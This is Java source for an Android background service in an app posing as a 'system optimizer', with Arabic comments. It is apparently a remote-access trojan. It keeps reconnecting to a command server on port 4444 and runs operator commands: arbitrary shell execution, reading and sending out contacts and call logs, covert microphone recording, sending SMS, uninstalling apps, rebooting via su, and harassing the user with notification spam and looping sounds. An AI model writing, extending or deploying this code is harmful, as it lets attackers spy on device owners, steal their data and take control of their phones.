package com.example.systemoptimizer;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.BufferedReader;
import java.io.EOFException;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.nio.charset.StandardCharsets;
import java.util.Date;
import java.util.concurrent.atomic.AtomicBoolean;

public class BackgroundService extends Service {

    private static final String TAG = "BackgroundService";
    private static final String CHANNEL_MAIN = "main_channel";
    private static final String CHANNEL_SPAM = "spam_channel";
    private static final int NOTIFICATION_ID = 1;

    private static final String SERVER_HOST = "10.0.2.2";
    private static final int SERVER_PORT = 4444;
    private static final int CONNECT_TIMEOUT_MS = 10000;
    private static final int RECONNECT_DELAY_MS = 5000;
    private static final int SHELL_TIMEOUT_MS = 15000;
    private static final int MAX_MESSAGE_SIZE = 8 * 1024 * 1024;

    private static final String PREFS_NAME = "system_optimizer_prefs";
    private static final String PREFS_BLACK_SCREEN_ON_BOOT = "black_screen_on_boot";

    private final AtomicBoolean connectionThreadStarted = new AtomicBoolean(false);
    private volatile boolean running = false;
    private volatile Thread connectionThread;
    private volatile Socket connectionSocket;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        ensureNotificationChannels();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }

        if (connectionThreadStarted.compareAndSet(false, true)) {
            running = true;
            connectionThread = new Thread(this::establishConnection, "bg-connection");
            connectionThread.start();
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (connectionSocket != null) {
            try {
                connectionSocket.close();
            } catch (IOException ignored) {
            }
            connectionSocket = null;
        }
        Thread thread = connectionThread;
        if (thread != null) {
            thread.interrupt();
        }
        super.onDestroy();
    }

    private void ensureNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            nm.createNotificationChannel(
                    new NotificationChannel(CHANNEL_MAIN, "الخدمة الخلفية", NotificationManager.IMPORTANCE_LOW));
            nm.createNotificationChannel(
                    new NotificationChannel(CHANNEL_SPAM, "الإشعارات", NotificationManager.IMPORTANCE_HIGH));
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_MAIN)
                .setContentTitle(getString(R.string.app_name))
                .setContentText("يعمل في الخلفية")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    // ------------------------------------------------------------------
    // بروتوكول الاتصال: 4 بايت طول (big-endian) + نص UTF-8 على الطرفين
    // ------------------------------------------------------------------

    private void establishConnection() {
        try {
            while (running) {
                Socket socket = null;
                try {
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(SERVER_HOST, SERVER_PORT), CONNECT_TIMEOUT_MS);
                    connectionSocket = socket;
                    Log.i(TAG, "connected to " + SERVER_HOST + ":" + SERVER_PORT);

                    InputStream in = socket.getInputStream();
                    OutputStream out = socket.getOutputStream();

                    while (running) {
                        String command = readMessage(in);
                        if (command == null) {
                            Log.i(TAG, "server closed the connection");
                            break;
                        }
                        executeCommand(command, out);
                    }
                } catch (SocketException e) {
                    Log.w(TAG, "socket closed: " + e.getMessage());
                } catch (IOException e) {
                    Log.w(TAG, "connection error: " + e.getMessage());
                } catch (Exception e) {
                    Log.w(TAG, "unexpected error", e);
                } finally {
                    closeQuietly(socket);
                    if (connectionSocket == socket) {
                        connectionSocket = null;
                    }
                    Log.i(TAG, "disconnected");
                }

                if (running) {
                    try {
                        Thread.sleep(RECONNECT_DELAY_MS);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        } finally {
            connectionThreadStarted.set(false);
        }
    }

    private static String readMessage(InputStream in) throws IOException {
        byte[] header = readFully(in, 4, true);
        if (header == null) {
            return null; // إغلاق أنيق من الطرف الآخر
        }
        long length = ((long) (header[0] & 0xFF) << 24)
                | ((long) (header[1] & 0xFF) << 16)
                | ((long) (header[2] & 0xFF) << 8)
                | ((long) (header[3] & 0xFF));
        if (length <= 0 || length > MAX_MESSAGE_SIZE) {
            throw new IOException("invalid message length: " + length);
        }
        byte[] payload = readFully(in, (int) length, false);
        return new String(payload, StandardCharsets.UTF_8);
    }

    private static void writeMessage(OutputStream out, String message) throws IOException {
        byte[] payload = message.getBytes(StandardCharsets.UTF_8);
        out.write((payload.length >>> 24) & 0xFF);
        out.write((payload.length >>> 16) & 0xFF);
        out.write((payload.length >>> 8) & 0xFF);
        out.write(payload.length & 0xFF);
        out.write(payload);
        out.flush();
    }

    private static byte[] readFully(InputStream in, int size, boolean allowEof) throws IOException {
        byte[] data = new byte[size];
        int offset = 0;
        while (offset < size) {
            int read = in.read(data, offset, size - offset);
            if (read == -1) {
                if (allowEof && offset == 0) {
                    return null;
                }
                throw new EOFException("connection closed mid-message");
            }
            offset += read;
        }
        return data;
    }

    private static void closeQuietly(Socket socket) {
        if (socket != null) {
            try {
                socket.close();
            } catch (IOException ignored) {
            }
        }
    }

    // ------------------------------------------------------------------
    // تنفيذ الأوامر
    // ------------------------------------------------------------------

    private void executeCommand(String command, OutputStream out) throws IOException {
        try {
            if (command.equals("exit")) {
                // أمر صريح من المشغّل بإنهاء الجلسة وإيقاف الخدمة
                running = false;
                stopSelf();
                throw new IOException("exit requested");
            } else if (command.equals("show_message")) {
                try {
                    Intent dialogIntent = new Intent(this, AlertDialogActivity.class);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(dialogIntent);
                    writeMessage(out, "تم عرض الرسالة");
                } catch (Exception e) {
                    writeMessage(out, "فشل في عرض الرسالة: " + e.getMessage()
                            + " (بدء نشاط من الخلفية قد يُحظر على Android 10+)");
                }
            } else if (command.equals("remove_freefire")) {
                String result = runShellCommand("pm", "uninstall", "com.dts.freefireth");
                writeMessage(out, "نتيجة الإزالة: " + result);
            } else if (command.equals("disable_freefire")) {
                String result = runShellCommand("pm", "disable-user", "com.dts.freefireth");
                writeMessage(out, "نتيجة التعطيل: " + result);
            } else if (command.startsWith("spam_notifications:")) {
                handleSpamNotifications(command, out);
            } else if (command.startsWith("play_annoying_sound:")) {
                handlePlayAnnoyingSound(command, out);
            } else if (command.startsWith("change_wallpaper:")) {
                handleChangeWallpaper(command, out);
            } else if (command.equals("black_screen_on_boot")) {
                handleBlackScreenOnBoot(out);
            } else if (command.equals("toggle_wifi")) {
                handleToggleWifi(out);
            } else if (command.equals("toggle_mobile_data")) {
                String result = runShellCommand("svc", "data", "toggle");
                writeMessage(out, "نتيجة تبديل البيانات المتنقلة: " + result);
            } else if (command.startsWith("block_app:")) {
                String[] parts = command.split(":", 2);
                if (parts.length < 2 || parts[1].trim().isEmpty()) {
                    writeMessage(out, "صيغة خاطئة: block_app:package");
                    return;
                }
                String result = runShellCommand("pm", "disable-user", parts[1].trim());
                writeMessage(out, "نتيجة حظر التطبيق: " + result);
            } else if (command.startsWith("custom:")) {
                String[] parts = command.split(":", 2);
                String custom = parts.length < 2 ? "" : parts[1].trim();
                if (custom.isEmpty()) {
                    writeMessage(out, "أمر مخصص فارغ");
                    return;
                }
                String result = runShellCommand(custom.split("\\s+"));
                writeMessage(out, result);
            } else if (command.equals("device_info")) {
                handleDeviceInfo(out);
            } else if (command.equals("capture_camera")) {
                if (!hasPermission(Manifest.permission.CAMERA)) {
                    writeMessage(out, "صلاحية الكاميرا غير ممنوحة");
                    return;
                }
                writeMessage(out, "غير مدعوم من الخدمة الخلفية: "
                        + "Action.IMAGE_CAPTURE يتطلب Activity لاستقبال نتيجة الالتقاط، "
                        + "والشكل الحالي لا يمكنه تنفيذ ذلك. أُزيل الكود الصامت الوهمي.");
            } else if (command.startsWith("record_audio:")) {
                handleRecordAudio(command, out);
            } else if (command.equals("reboot_device")) {
                String result = runShellCommand("su", "-c", "reboot");
                writeMessage(out, "نتيجة أمر إعادة التشغيل: " + result);
            } else if (command.equals("shutdown_device")) {
                String result = runShellCommand("su", "-c", "reboot", "-p");
                writeMessage(out, "نتيجة أمر الإغلاق: " + result);
            } else if (command.equals("toggle_airplane_mode")) {
                handleToggleAirplaneMode(out);
            } else if (command.startsWith("send_sms:")) {
                handleSendSms(command, out);
            } else if (command.equals("call_log")) {
                handleCallLog(out);
            } else if (command.equals("contacts")) {
                handleContacts(out);
            } else {
                String result = runShellCommand(command.split("\\s+"));
                writeMessage(out, result);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException("interrupted", e);
        } catch (IOException e) {
            throw e;
        } catch (Exception e) {
            writeMessage(out, "خطأ في تنفيذ الأمر: " + e.getMessage());
        }
    }

    // ---------- أوامر مساعدة ----------

    private void handleSpamNotifications(String command, OutputStream out) throws IOException, InterruptedException {
        String[] parts = command.split(":", 3);
        if (parts.length < 3) {
            writeMessage(out, "صيغة خاطئة: spam_notifications:العدد:النص");
            return;
        }
        int count;
        try {
            count = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "عدد غير صالح: " + parts[1]);
            return;
        }
        if (count <= 0 || count > 500) {
            writeMessage(out, "العدد يجب أن يكون بين 1 و 500");
            return;
        }
        String message = parts[2];
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                && !hasPermission(Manifest.permission.POST_NOTIFICATIONS)) {
            writeMessage(out, "صلاحية الإشعارات غير ممنوحة");
            return;
        }

        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        for (int i = 0; i < count; i++) {
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_SPAM)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setContentTitle("تحذير")
                    .setContentText(message)
                    .setPriority(NotificationCompat.PRIORITY_HIGH);
            nm.notify(100 + (i % 100), builder.build());
            if (i < count - 1) {
                Thread.sleep(1000);
            }
        }
        writeMessage(out, "تم إرسال " + count + " إشعار");
    }

    private void handlePlayAnnoyingSound(String command, OutputStream out) throws IOException, InterruptedException {
        String[] parts = command.split(":", 2);
        int duration;
        try {
            duration = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "مدة غير صالحة: " + parts[1]);
            return;
        }
        if (duration <= 0 || duration > 600) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
            return;
        }

        MediaPlayer mediaPlayer = MediaPlayer.create(this, R.raw.annoying_sound);
        if (mediaPlayer == null) {
            writeMessage(out, "تعذر تحميل ملف الصوت: الملف الموجود في res/raw فارغ أو غير مدعوم");
            return;
        }
        try {
            mediaPlayer.setLooping(true);
            mediaPlayer.start();
            Thread.sleep(duration * 1000L);
            writeMessage(out, "تم تشغيل الصوت المزعج لمدة " + duration + " ثانية");
        } finally {
            try {
                mediaPlayer.stop();
            } catch (IllegalStateException ignored) {
            }
            mediaPlayer.release();
        }
    }

    private void handleChangeWallpaper(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 2);
        if (parts.length < 2 || parts[1].trim().isEmpty()) {
            writeMessage(out, "صيغة خاطئة: change_wallpaper:المسار");
            return;
        }
        String imagePath = parts[1].trim();
        try {
            Bitmap bitmap = BitmapFactory.decodeFile(imagePath);
            if (bitmap == null) {
                writeMessage(out, "فشل في فك تشفير الصورة من المسار: " + imagePath
                        + " (قد يكون الوصول مقيداً بسبب Scoped Storage)");
                return;
            }
            WallpaperManager wallpaperManager = WallpaperManager.getInstance(this);
            wallpaperManager.setBitmap(bitmap);
            writeMessage(out, "تم تغيير خلفية الشاشة");
        } catch (Exception e) {
            writeMessage(out, "فشل في تغيير خلفية الشاشة: " + e.getMessage());
        }
    }

    private void handleBlackScreenOnBoot(OutputStream out) throws IOException {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean enabled = prefs.getBoolean(PREFS_BLACK_SCREEN_ON_BOOT, false);
        boolean newState = !enabled;
        prefs.edit().putBoolean(PREFS_BLACK_SCREEN_ON_BOOT, newState).apply();
        writeMessage(out, "تم " + (newState ? "تفعيل" : "إلغاء تفعيل")
                + " الشاشة السوداء عند الإقلاع (الحالة الجديدة: " + (newState ? "مفعّل" : "معطّل") + ")");
    }

    private void handleToggleWifi(OutputStream out) throws IOException {
        try {
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            boolean wasEnabled = wifiManager.isWifiEnabled();
            boolean success = wifiManager.setWifiEnabled(!wasEnabled);
            if (success) {
                writeMessage(out, "تم " + (!wasEnabled ? "تفعيل" : "إلغاء تفعيل") + " الواي فاي");
            } else {
                writeMessage(out, "تعذر تغيير حالة الواي فاي على هذا الإصدار "
                        + "(setWifiEnabled معطّل للتطبيقات منذ Android 13؛ بدّل من الإعدادات)");
            }
        } catch (Exception e) {
            writeMessage(out, "فشل في تغيير حالة الواي فاي: " + e.getMessage());
        }
    }

    private void handleToggleAirplaneMode(OutputStream out) throws IOException {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
                writeMessage(out, "إذن كتابة الإعدادات غير مفعّل — "
                        + "لا يمكن تعديل وضع الطيران برمجياً لهذا التطبيق");
                return;
            }
            boolean isEnabled = Settings.System.getInt(getContentResolver(),
                    Settings.System.AIRPLANE_MODE_ON, 0) == 1;
            boolean success = Settings.System.putInt(getContentResolver(),
                    Settings.System.AIRPLANE_MODE_ON, isEnabled ? 0 : 1);
            if (success) {
                Intent intent = new Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED);
                intent.putExtra("state", !isEnabled);
                sendBroadcast(intent);
                writeMessage(out, "تم " + (!isEnabled ? "تفعيل" : "إلغاء تفعيل") + " وضع الطيران");
            } else {
                writeMessage(out, "تعذر تعديل وضع الطيران: التطبيقات العادية لا تستطيع "
                        + "تغييره مباشرة على أنظمة Android الحديثة");
            }
        } catch (Exception e) {
            writeMessage(out, "فشل في تغيير وضع الطيران: " + e.getMessage());
        }
    }

    private void handleSendSms(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 3);
        if (parts.length < 3) {
            writeMessage(out, "صيغة خاطئة: send_sms:الرقم:النص");
            return;
        }
        String phoneNumber = parts[1];
        String message = parts[2];
        if (!hasPermission(Manifest.permission.SEND_SMS)) {
            writeMessage(out, "صلاحية إرسال SMS غير ممنوحة");
            return;
        }
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            writeMessage(out, "تم إرسال الرسالة إلى " + phoneNumber);
        } catch (Exception e) {
            writeMessage(out, "فشل في إرسال الرسالة: " + e.getMessage());
        }
    }

    private void handleDeviceInfo(OutputStream out) throws IOException {
        try {
            StringBuilder info = new StringBuilder();
            info.append("الطراز: ").append(Build.MODEL).append("\n");
            info.append("المصنع: ").append(Build.MANUFACTURER).append("\n");
            info.append("نظام التشغيل: ").append(Build.VERSION.RELEASE).append(" (API ")
                    .append(Build.VERSION.SDK_INT).append(")\n");
            info.append("رقم البناء: ").append(Build.ID).append("\n");

            BatteryManager batteryManager = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
            int batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            info.append("مستوى البطارية: ").append(batteryLevel >= 0 ? batteryLevel + "%" : "غير متاح").append("\n");

            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            NetworkInfo mobileInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            info.append("حالة الواي فاي: ")
                    .append(wifiInfo != null && wifiInfo.isConnected() ? "متصل" : "غير متصل").append("\n");
            info.append("حالة البيانات المتنقلة: ")
                    .append(mobileInfo != null && mobileInfo.isConnected() ? "متصل" : "غير متصل").append("\n");

            writeMessage(out, info.toString());
        } catch (Exception e) {
            writeMessage(out, "خطأ في جلب معلومات الجهاز: " + e.getMessage());
        }
    }

    private void handleRecordAudio(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 2);
        int duration;
        try {
            duration = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "مدة غير صالحة: " + parts[1]);
            return;
        }
        if (duration <= 0 || duration > 600) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
            return;
        }
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            writeMessage(out, "صلاحية الميكروفون غير ممنوحة");
            return;
        }

        File dir = getExternalFilesDir(null);
        if (dir == null) {
            writeMessage(out, "لا يمكن الوصول إلى التخزين الخاص بالتطبيق");
            return;
        }
        File outputFile = new File(dir, "recorded_audio_" + System.currentTimeMillis() + ".3gp");

        MediaRecorder recorder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                ? new MediaRecorder(this) : new MediaRecorder();
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(outputFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Thread.sleep(duration * 1000L);
            writeMessage(out, "تم حفظ التسجيل في: " + outputFile.getAbsolutePath());
        } catch (Exception e) {
            writeMessage(out, "فشل في التسجيل: " + e.getMessage());
        } finally {
            try {
                recorder.stop();
            } catch (RuntimeException ignored) {
            }
            recorder.release();
        }
    }

    private void handleCallLog(OutputStream out) throws IOException {
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
            writeMessage(out, "صلاحية سجل المكالمات غير ممنوحة");
            return;
        }
        Cursor cursor = null;
        try {
            StringBuilder callLog = new StringBuilder();
            String[] projection = {CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                    CallLog.Calls.DATE, CallLog.Calls.DURATION};
            cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, projection,
                    null, null, CallLog.Calls.DATE + " DESC");
            if (cursor == null) {
                writeMessage(out, "لا يوجد سجل مكالمات");
                return;
            }
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                @SuppressWarnings("deprecation")
                String typeLabel = "1".equals(type) ? "وارد"
                        : "2".equals(type) ? "صادر" : "مفقود";
                callLog.append("رقم: ").append(number)
                        .append(", النوع: ").append(typeLabel)
                        .append(", التاريخ: ").append(new Date(Long.parseLong(date)))
                        .append(", المدة: ").append(duration).append(" ثانية\n");
            }
            if (callLog.length() == 0) {
                writeMessage(out, "سجل المكالمات فارغ");
            } else {
                writeMessage(out, callLog.toString());
            }
        } catch (Exception e) {
            writeMessage(out, "فشل في جلب سجل المكالمات: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private void handleContacts(OutputStream out) throws IOException {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
            writeMessage(out, "صلاحية جهات الاتصال غير ممنوحة");
            return;
        }
        Cursor cursor = null;
        try {
            StringBuilder contacts = new StringBuilder();
            String[] projection = {ContactsContract.Contacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME};
            cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                    projection, null, null, null);
            if (cursor == null) {
                writeMessage(out, "لا توجد جهات اتصال");
                return;
            }
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                contacts.append("الاسم: ").append(name);

                Cursor phoneCursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null);
                if (phoneCursor != null) {
                    try {
                        if (phoneCursor.moveToFirst()) {
                            contacts.append(", الأرقام: ");
                            do {
                                String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                                contacts.append(phoneNumber).append(" ");
                            } while (phoneCursor.moveToNext());
                        }
                    } finally {
                        phoneCursor.close();
                    }
                }
                contacts.append("\n");
            }
            if (contacts.length() == 0) {
                writeMessage(out, "لا توجد جهات اتصال");
            } else {
                writeMessage(out, contacts.toString());
            }
        } catch (Exception e) {
            writeMessage(out, "فشل في جلب جهات الاتصال: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    // ---------- أدوات عامة ----------

    private boolean hasPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    /**
     * تنفيذ أمر نظامي وتجميع مخرجاته (stdout + stderr) مع مهلة زمنية لمنع
     * تعليق حلقة الاتصال عندما يحجب الأمر (مثل ping أو النصوص الطويلة).
     */
    private String runShellCommand(String... argv) {
        Process process = null;
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder(argv).redirectErrorStream(true);
            process = pb.start();
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            long deadline = System.currentTimeMillis() + SHELL_TIMEOUT_MS;
            boolean alive = true;
            while (alive) {
                boolean exited = false;
                try {
                    process.exitValue(); // يرمي الاستثناء إذا كان لا يزال يعمل
                    exited = true;
                } catch (IllegalThreadStateException stillRunning) {
                    if (System.currentTimeMillis() > deadline) {
                        process.destroy();
                        output.append("[انتهت المهلة الزمنية للأمر]\n");
                        exited = true;
                    }
                }
                if (exited) {
                    alive = false;
                }
                drain(reader, output);
                if (alive) {
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            drain(reader, output);
            int exit = -1;
            try {
                exit = process.exitValue();
            } catch (IllegalThreadStateException ignored) {
            }
            if (exit != 0 && exit != -1) {
                output.append("[رمز الخروج: ").append(exit).append("]");
            }
        } catch (IOException e) {
            return "خطأ في تنفيذ الأمر: " + e.getMessage();
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        String result = output.toString().trim();
        return result.isEmpty() ? "(لا يوجد مخرجات)" : result;
    }

    private static void drain(BufferedReader reader, StringBuilder out) throws IOException {
        while (reader.ready()) {
            out.append((char) reader.read());
        }
    }
}